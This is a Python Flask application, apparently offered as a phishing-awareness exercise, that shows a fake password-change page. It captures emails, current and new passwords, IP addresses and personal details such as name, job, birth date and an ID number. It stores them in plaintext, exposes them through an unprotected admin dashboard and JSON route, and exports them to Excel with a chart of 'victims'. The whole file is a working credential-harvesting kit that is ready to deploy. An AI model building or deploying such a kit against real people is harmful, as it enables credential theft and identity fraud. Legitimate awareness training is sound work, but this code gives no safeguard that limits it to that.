from flask import Flask, render_template, request, redirect, url_for, jsonify, send_file
import datetime
import io
import openpyxl
from openpyxl.styles import Font, PatternFill, Alignment, Border, Side
from openpyxl.utils import get_column_letter
from openpyxl.chart import LineChart, Reference

app = Flask(__name__)

# Base de données temporaire en mémoire
CAPTURED_LOGINS = []
USER_PROFILES = []

@app.route('/')
def login_page():
    """Interface Utilisateur - Étape 1 : Faux changement de mot de passe"""
    return render_template('login.html')

@app.route('/submit-login', methods=['POST'])
def submit_login():
    """Capture les identifiants et redirige vers le formulaire"""
    email = request.form.get('email')
    current_password = request.form.get('current_password')
    new_password = request.form.get('new_password')
    
    entry = {
        'id': len(CAPTURED_LOGINS) + 1,
        'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'email': email,
        'current_password': current_password,
        'new_password': new_password,
        'ip': request.remote_addr
    }
    CAPTURED_LOGINS.append(entry)
    
    return redirect(url_for('profile_page', email=email))

@app.route('/formulaire')
def profile_page():
    """Interface Utilisateur - Étape 2 : Saisie des informations personnelles"""
    email = request.args.get('email', '')
    return render_template('profile.html', email=email)

@app.route('/submit-profile', methods=['POST'])
def submit_profile():
    """Capture les données personnelles de l'utilisateur"""
    profile_data = {
        'id': len(USER_PROFILES) + 1,
        'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'email': request.form.get('email'),
        'nom': request.form.get('nom'),
        'postnom': request.form.get('postnom'),
        'poste': request.form.get('poste'),
        'genre': request.form.get('genre'),
        'cus_num': request.form.get('cus_num'),
        'date_naissance': request.form.get('date_naissance'),
        'etat_civil': request.form.get('etat_civil')
    }
    USER_PROFILES.append(profile_data)
    
    return render_template('success.html')

# ==================== INTERFACE ADMINISTRATEUR ====================

@app.route('/admin')
def admin_page():
    """Interface Dashboard pour le formateur/sensibilisateur"""
    return render_template('admin.html', logins=CAPTURED_LOGINS, profiles=USER_PROFILES)

@app.route('/api/data')
def api_data():
    """Route API pour le rafraîchissement automatique de la vue Admin"""
    return jsonify({
        'logins': CAPTURED_LOGINS,
        'profiles': USER_PROFILES
    })

@app.route('/admin/clear', methods=['POST'])
def clear_data():
    """Permet de vider les données de démonstration"""
    CAPTURED_LOGINS.clear()
    USER_PROFILES.clear()
    return redirect(url_for('admin_page'))

# ==================== EXPORTATION EXCEL AVEC GRAPHIQUE ====================

@app.route('/admin/export-excel')
def export_excel():
    """Génère et télécharge un rapport Excel professionnel avec graphique de progression"""
    wb = openpyxl.Workbook()
    
    # --- Styles ---
    header_fill = PatternFill(start_color="1F2937", end_color="1F2937", fill_type="solid")  # Slate 800
    header_font = Font(name="Calibri", size=11, bold=True, color="FFFFFF")
    title_font = Font(name="Calibri", size=16, bold=True, color="1F2937")
    subtitle_font = Font(name="Calibri", size=10, italic=True, color="6B7280")
    bold_font = Font(name="Calibri", size=11, bold=True)
    border_thin = Border(
        left=Side(style='thin', color='D1D5DB'),
        right=Side(style='thin', color='D1D5DB'),
        top=Side(style='thin', color='D1D5DB'),
        bottom=Side(style='thin', color='D1D5DB')
    )
    
    # ------------------------------------------------------------------
    # 1. FEUILLE : Données Victimes
    # ------------------------------------------------------------------
    ws_data = wb.active
    ws_data.title = "Données Capturées"
    
    headers = [
        "# ID", "Horodatage", "Adresse Email", "Ancien Mot de Passe", "Nouveau Mot de Passe",
        "Nom", "Post-nom", "Poste / Fonction", "Genre", "CUS NUM", "Date de Naissance", "État Civil"
    ]
    
    # Titre
    ws_data.merge_cells("A1:L1")
    ws_data["A1"] = "RAPPORT DE SENSIBILISATION - INTERCEPTION DE DONNÉES"
    ws_data["A1"].font = title_font
    
    ws_data["A2"] = f"Généré le : {datetime.datetime.now().strftime('%d/%m/%Y à %H:%M:%S')}"
    ws_data["A2"].font = subtitle_font
    
    # En-têtes
    for col_num, header in enumerate(headers, 1):
        cell = ws_data.cell(row=4, column=col_num, value=header)
        cell.fill = header_fill
        cell.font = header_font
        cell.alignment = Alignment(horizontal="center", vertical="center")

    # Association des données (Logins + Profils)
    profiles_by_email = {p['email']: p for p in USER_PROFILES}
    
    row_idx = 5
    for log in CAPTURED_LOGINS:
        prof = profiles_by_email.get(log['email'], {})
        
        row_data = [
            log['id'],
            log['timestamp'],
            log['email'],
            log['current_password'],
            log['new_password'],
            prof.get('nom', 'Non renseigné'),
            prof.get('postnom', ''),
            prof.get('poste', ''),
            prof.get('genre', ''),
            prof.get('cus_num', ''),
            prof.get('date_naissance', ''),
            prof.get('etat_civil', '')
        ]
        
        for col_num, val in enumerate(row_data, 1):
            cell = ws_data.cell(row=row_idx, column=col_num, value=val)
            cell.border = border_thin
            if col_num in [1, 2, 9, 10, 11]:
                cell.alignment = Alignment(horizontal="center")
        
        row_idx += 1
        
    # Ajuster la largeur des colonnes
    for col in ws_data.columns:
        max_len = max(len(str(cell.value or '')) for cell in col)
        col_letter = get_column_letter(col[0].column)
        ws_data.column_dimensions[col_letter].width = max(max_len + 3, 12)

    # ------------------------------------------------------------------
    # 2. FEUILLE : Dashboard & Graphique de Progression
    # ------------------------------------------------------------------
    ws_dash = wb.create_sheet(title="Dashboard & Progression")
    
    ws_dash["A1"] = "EVOLUTION DES CAPTURES EN TEMPS RÉEL"
    ws_dash["A1"].font = title_font
    
    # Tableau récapitulatif pour alimenter le graphique
    dash_headers = ["N° Interception", "Horodatage", "Cumul Identifiants", "Cumul Profils"]
    for c_idx, h in enumerate(dash_headers, 1):
        cell = ws_dash.cell(row=3, column=c_idx, value=h)
        cell.fill = header_fill
        cell.font = header_font
        cell.alignment = Alignment(horizontal="center")

    # Alimentation du tableau de cumul
    login_count = 0
    profile_count_cumul = 0
    
    # On reconstruit une frise chronologique basée sur CAPTURED_LOGINS
    for idx, log in enumerate(CAPTURED_LOGINS, start=1):
        login_count += 1
        # Vérifie si le profil a aussi été complété
        if any(p['email'] == log['email'] for p in USER_PROFILES):
            profile_count_cumul += 1
            
        r_idx = idx + 3
        ws_dash.cell(row=r_idx, column=1, value=idx).border = border_thin
        ws_dash.cell(row=r_idx, column=2, value=log['timestamp']).border = border_thin
        ws_dash.cell(row=r_idx, column=3, value=login_count).border = border_thin
        ws_dash.cell(row=r_idx, column=4, value=profile_count_cumul).border = border_thin

    # Création du Graphique en Courbe (Line Chart)
    if len(CAPTURED_LOGINS) > 0:
        chart = LineChart()
        chart.title = "Progression de la prise d'informations"
        chart.style = 13
        chart.y_axis.title = "Nombre de victimes"
        chart.x_axis.title = "Séquence des attaques"
        chart.width = 18
        chart.height = 10
        
        # Références des données (Colonnes C et D : Cumul Identifiants et Cumul Profils)
        data_ref = Reference(ws_dash, min_col=3, min_row=3, max_col=4, max_row=len(CAPTURED_LOGINS)+3)
        cats_ref = Reference(ws_dash, min_col=2, min_row=4, max_row=len(CAPTURED_LOGINS)+3)
        
        chart.add_data(data_ref, titles_from_data=True)
        chart.set_categories(cats_ref)
        
        # Insertion du graphique dans l'onglet Dashboard
        ws_dash.add_chart(chart, "F3")

    # Ajustement colonnes Dashboard
    for col in ws_dash.columns:
        max_len = max(len(str(cell.value or '')) for cell in col)
        col_letter = get_column_letter(col[0].column)
        ws_dash.column_dimensions[col_letter].width = max(max_len + 3, 15)

    # Réenregistrement en mémoire buffer pour l'envoi Flask
    output = io.BytesIO()
    wb.save(output)
    output.seek(0)
    
    filename = f"Rapport_Sensibilisation_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.xlsx"
    
    return send_file(
        output,
        mimetype="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        as_attachment=True,
        download_name=filename
    )

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)